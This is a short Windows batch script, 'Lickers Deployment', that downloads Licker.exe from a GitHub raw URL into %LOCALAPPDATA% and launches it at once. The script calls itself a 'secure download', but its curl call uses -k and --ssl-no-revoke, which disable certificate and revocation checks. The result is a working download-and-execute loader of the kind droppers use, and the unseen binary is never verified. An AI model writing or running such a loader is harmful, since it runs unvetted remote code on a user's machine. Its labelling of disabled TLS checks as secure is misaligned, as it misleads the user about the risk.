@echo off
title Lickers Deployment
echo [SYSTEM] Initializing secure download...

set "TARGET_DIR=%LOCALAPPDATA%\Lickers"
set "TARGET_EXE=%TARGET_DIR%\Licker.exe"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: Secure download using the flags that fixed your SSL error
curl -k --ssl-no-revoke -L -f -o "%TARGET_EXE%" "https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"

if exist "%TARGET_EXE%" (
    echo [SUCCESS] Launching Portal...
    start "" "%TARGET_EXE%"
    timeout /t 3 >nul
) else (
    echo [ERROR] Download failed. Check your connection.
    pause
)
exit
